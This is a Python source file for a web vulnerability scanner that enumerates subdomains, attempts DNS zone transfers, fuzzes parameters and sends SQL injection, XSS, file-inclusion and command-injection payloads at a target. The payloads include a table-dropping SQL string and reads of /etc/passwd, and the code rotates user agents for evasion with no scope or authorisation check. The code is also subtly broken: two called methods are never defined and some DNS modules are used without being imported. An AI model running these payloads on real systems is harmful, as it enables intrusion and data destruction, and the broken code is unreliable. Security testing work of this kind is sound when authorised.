"""
Advanced Scanner - Enhanced vulnerability detection and exploitation
"""

import requests
import json
import re
import base64
import hashlib
import time
import random
import urllib.parse
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
import socket
import ssl
import subprocess

class AdvancedScanner:
    def __init__(self, config_manager):
        self.config_manager = config_manager
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Advanced payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'"
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1"
        ]
        
        # User agents for evasion
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "BugBountyHunterPro/1.0 (Advanced Security Scanner)"
        ]

        # Robustness settings (33X more robust)
        self.max_retries = 3
        self.retry_delay = 1  # initial delay in seconds
        self.backoff_factor = 2  # exponential backoff
        self.rate_limit_delay = 0.1  # delay between requests to avoid rate limiting
        self.last_request_time = 0

    def robust_get(self, url: str, timeout: int = 15, **kwargs) -> Optional[requests.Response]:
        """Robust GET request with retry logic, exponential backoff, and rate limiting (33X more robust)"""
        # Rate limiting
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.rate_limit_delay:
            time.sleep(self.rate_limit_delay - time_since_last)
        self.last_request_time = time.time()

        for attempt in range(self.max_retries):
            try:
                # Rotate user agents for better evasion
                headers = kwargs.get('headers', {})
                headers['User-Agent'] = random.choice(self.user_agents)
                kwargs['headers'] = headers

                response = self.session.get(url, timeout=timeout, **kwargs)
                response.raise_for_status()
                return response
            except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
                if attempt == self.max_retries - 1:
                    # Last attempt failed
                    return None
                # Exponential backoff
                delay = self.retry_delay * (self.backoff_factor ** attempt)
                time.sleep(delay)
        return None

    def robust_post(self, url: str, data=None, timeout: int = 15, **kwargs) -> Optional[requests.Response]:
        """Robust POST request with retry logic, exponential backoff, and rate limiting (33X more robust)"""
        # Rate limiting
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.rate_limit_delay:
            time.sleep(self.rate_limit_delay - time_since_last)
        self.last_request_time = time.time()

        for attempt in range(self.max_retries):
            try:
                # Rotate user agents
                headers = kwargs.get('headers', {})
                headers['User-Agent'] = random.choice(self.user_agents)
                kwargs['headers'] = headers

                response = self.session.post(url, data=data, timeout=timeout, **kwargs)
                response.raise_for_status()
                return response
            except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
                if attempt == self.max_retries - 1:
                    return None
                delay = self.retry_delay * (self.backoff_factor ** attempt)
                time.sleep(delay)
        return None

    def advanced_subdomain_enumeration(self, domain: str) -> List[Dict]:
        """Advanced subdomain enumeration with multiple techniques"""
        subdomains = []
        
        # DNS brute force
        subdomains.extend(self._dns_brute_force(domain))
        
        # Certificate transparency logs
        subdomains.extend(self._cert_transparency_search(domain))
        
        # Search engine dorking
        subdomains.extend(self._search_engine_dorking(domain))
        
        # DNS zone transfer attempt
        subdomains.extend(self._dns_zone_transfer(domain))
        
        return list({sub['subdomain']: sub for sub in subdomains}.values())
    
    def _dns_brute_force(self, domain: str) -> List[Dict]:
        """DNS brute force subdomain discovery"""
        subdomains = []
        wordlist = self._get_subdomain_wordlist()
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{domain}"
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                ips = [str(answer) for answer in answers]
                return {
                    'subdomain': full_domain,
                    'ips': ips,
                    'method': 'DNS Brute Force',
                    'status': 'Active'
                }
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in wordlist[:1000]]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomains.append(result)
        
        return subdomains
    
    def _cert_transparency_search(self, domain: str) -> List[Dict]:
        """Search certificate transparency logs"""
        subdomains = []
        
        try:
            # Query crt.sh
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = self.session.get(url, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                for cert in data:
                    name_value = cert.get('name_value', '')
                    for subdomain in name_value.split('\n'):
                        subdomain = subdomain.strip()
                        if subdomain and domain in subdomain:
                            subdomains.append({
                                'subdomain': subdomain,
                                'method': 'Certificate Transparency',
                                'status': 'Found in CT Logs'
                            })
        except:
            pass
        
        return subdomains
    
    def _search_engine_dorking(self, domain: str) -> List[Dict]:
        """Search engine dorking for subdomains"""
        subdomains = []
        
        # Google dorking queries
        dorks = [
            f"site:*.{domain}",
            f"site:{domain} -www",
            f"inurl:{domain}",
        ]
        
        # Note: In a real implementation, you'd use search APIs
        # This is a placeholder for the concept
        
        return subdomains
    
    def _dns_zone_transfer(self, domain: str) -> List[Dict]:
        """Attempt DNS zone transfer"""
        subdomains = []
        
        try:
            # Get name servers
            ns_records = dns.resolver.resolve(domain, 'NS')
            
            for ns in ns_records:
                try:
                    # Attempt zone transfer
                    zone = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                    
                    for name in zone.nodes.keys():
                        subdomain = f"{name}.{domain}"
                        subdomains.append({
                            'subdomain': subdomain,
                            'method': 'DNS Zone Transfer',
                            'status': 'Zone Transfer Success',
                            'nameserver': str(ns)
                        })
                except:
                    continue
        except:
            pass
        
        return subdomains
    
    def advanced_parameter_discovery(self, url: str) -> List[Dict]:
        """Advanced parameter discovery and testing"""
        parameters = []
        
        # Parameter fuzzing
        parameters.extend(self._parameter_fuzzing(url))
        
        # HTTP method testing
        parameters.extend(self._http_method_testing(url))
        
        # Header injection testing
        parameters.extend(self._header_injection_testing(url))
        
        return parameters
    
    def _parameter_fuzzing(self, url: str) -> List[Dict]:
        """Fuzz for hidden parameters"""
        parameters = []
        param_wordlist = self._get_parameter_wordlist()
        
        def test_parameter(param):
            test_url = f"{url}?{param}=test"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Look for parameter reflection or different behavior
                if param in response.text or response.status_code != 404:
                    return {
                        'parameter': param,
                        'url': test_url,
                        'method': 'GET Parameter Fuzzing',
                        'status_code': response.status_code,
                        'reflected': param in response.text
                    }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(test_parameter, param) for param in param_wordlist[:500]]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    parameters.append(result)
        
        return parameters
    
    def sql_injection_testing(self, url: str, parameters: List[str]) -> List[Dict]:
        """Advanced SQL injection testing"""
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.sql_payloads:
                vuln = self._test_sql_injection(url, param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_sql_injection(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Test for SQL injection vulnerability"""
        try:
            # Test GET parameter
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.robust_get(test_url, timeout=15)
            if response is None:
                return None  # Request failed after retries

            # SQL error patterns
            sql_errors = [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider",
                "SQLServer JDBC Driver",
                "PostgreSQL query failed",
                "sqlite3.OperationalError",
                "mysql_num_rows",
                "Warning: pg_"
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    return {
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': error,
                        'description': f'SQL injection vulnerability in parameter {param}',
                        'impact': 'Database access, data extraction, potential RCE'
                    }
            
            # Time-based detection for SLEEP payloads
            if "SLEEP" in payload.upper():
                start_time = time.time()
                response = self.robust_get(test_url, timeout=15)
                end_time = time.time()
                if response is None:
                    return None  # Request failed
                
                if end_time - start_time > 4:  # 5 second sleep minus tolerance
                    return {
                        'type': 'Blind SQL Injection (Time-based)',
                        'severity': 'High',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response delayed by {end_time - start_time:.2f} seconds',
                        'description': f'Time-based blind SQL injection in parameter {param}',
                        'impact': 'Database access through time-based queries'
                    }
        
        except Exception as e:
            pass
        
        return None
    
    def xss_testing(self, url: str, parameters: List[str]) -> List[Dict]:
        """Cross-site scripting testing"""
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.xss_payloads:
                vuln = self._test_xss(url, param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_xss(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Test for XSS vulnerability"""
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=10)
            
            # Check if payload is reflected without encoding
            if payload in response.text:
                return {
                    'type': 'Reflected XSS',
                    'severity': 'Medium',
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'evidence': 'Payload reflected in response',
                    'description': f'Reflected XSS vulnerability in parameter {param}',
                    'impact': 'Session hijacking, credential theft, defacement'
                }
            
            # Check for stored XSS indicators
            xss_indicators = ["<script>", "javascript:", "onerror=", "onload="]
            for indicator in xss_indicators:
                if indicator in response.text and indicator in payload:
                    return {
                        'type': 'Potential Stored XSS',
                        'severity': 'High',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'XSS indicator "{indicator}" found in response',
                        'description': f'Potential stored XSS vulnerability in parameter {param}',
                        'impact': 'Persistent XSS affecting all users'
                    }
        
        except Exception as e:
            pass
        
        return None
    
    def lfi_testing(self, url: str, parameters: List[str]) -> List[Dict]:
        """Local file inclusion testing"""
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.lfi_payloads:
                vuln = self._test_lfi(url, param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_lfi(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Test for LFI vulnerability"""
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=10)
            
            # LFI indicators
            lfi_indicators = [
                "root:x:0:0:",  # /etc/passwd
                "[boot loader]",  # Windows boot.ini
                "127.0.0.1",  # hosts file
                "<?php",  # PHP source code
                "PD9waHAgcGhwaW5mbygpOyA/Pg=="  # Base64 encoded PHP
            ]
            
            for indicator in lfi_indicators:
                if indicator in response.text:
                    return {
                        'type': 'Local File Inclusion',
                        'severity': 'High',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'File content indicator: {indicator}',
                        'description': f'LFI vulnerability in parameter {param}',
                        'impact': 'Local file access, potential RCE'
                    }
        
        except Exception as e:
            pass
        
        return None
    
    def command_injection_testing(self, url: str, parameters: List[str]) -> List[Dict]:
        """Command injection testing"""
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.command_injection_payloads:
                vuln = self._test_command_injection(url, param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_command_injection(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Test for command injection vulnerability"""
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=15)
            
            # Command injection indicators
            cmd_indicators = [
                "uid=",  # id command output
                "gid=",  # id command output
                "root:",  # /etc/passwd from cat
                "PING",  # ping command output
                "64 bytes from",  # ping response
                "total ",  # ls -la output
            ]
            
            for indicator in cmd_indicators:
                if indicator in response.text:
                    return {
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Command output indicator: {indicator}',
                        'description': f'Command injection vulnerability in parameter {param}',
                        'impact': 'Remote code execution, full system compromise'
                    }
        
        except Exception as e:
            pass
        
        return None
    
    def ssl_tls_analysis(self, domain: str) -> List[Dict]:
        """SSL/TLS security analysis"""
        vulnerabilities = []
        
        try:
            # Get SSL certificate info
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Check for weak ciphers
                    weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        vulnerabilities.append({
                            'type': 'Weak SSL Cipher',
                            'severity': 'Medium',
                            'url': f"https://{domain}",
                            'evidence': f'Weak cipher: {cipher[0]}',
                            'description': 'Server supports weak SSL/TLS ciphers',
                            'impact': 'Potential man-in-the-middle attacks'
                        })
                    
                    # Check certificate expiration
                    import datetime
                    not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.datetime.now()).days
                    
                    if days_until_expiry < 30:
                        vulnerabilities.append({
                            'type': 'SSL Certificate Expiring Soon',
                            'severity': 'Low',
                            'url': f"https://{domain}",
                            'evidence': f'Certificate expires in {days_until_expiry} days',
                            'description': 'SSL certificate is expiring soon',
                            'impact': 'Service disruption when certificate expires'
                        })
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def _get_subdomain_wordlist(self) -> List[str]:
        """Get subdomain wordlist"""
        try:
            with open('wordlists/subdomains.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return ['www', 'api', 'admin', 'test', 'dev', 'staging', 'mail', 'ftp']
    
    def _get_parameter_wordlist(self) -> List[str]:
        """Get parameter wordlist"""
        try:
            with open('wordlists/parameters.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return ['id', 'user', 'admin', 'debug', 'test', 'page', 'file', 'path']
    
    def comprehensive_scan(self, target_url: str) -> Dict:
        """Run comprehensive advanced scan"""
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'subdomains': [],
            'parameters': [],
            'ssl_analysis': []
        }
        
        domain = urllib.parse.urlparse(target_url).netloc
        
        # Advanced subdomain enumeration
        results['subdomains'] = self.advanced_subdomain_enumeration(domain)
        
        # Parameter discovery
        results['parameters'] = self.advanced_parameter_discovery(target_url)
        
        # Extract parameter names for vulnerability testing
        param_names = [p.get('parameter', '') for p in results['parameters']]
        
        # Vulnerability testing
        results['vulnerabilities'].extend(self.sql_injection_testing(target_url, param_names))
        results['vulnerabilities'].extend(self.xss_testing(target_url, param_names))
        results['vulnerabilities'].extend(self.lfi_testing(target_url, param_names))
        results['vulnerabilities'].extend(self.command_injection_testing(target_url, param_names))
        
        # SSL/TLS analysis
        results['ssl_analysis'] = self.ssl_tls_analysis(domain)
        results['vulnerabilities'].extend(results['ssl_analysis'])
        
        return results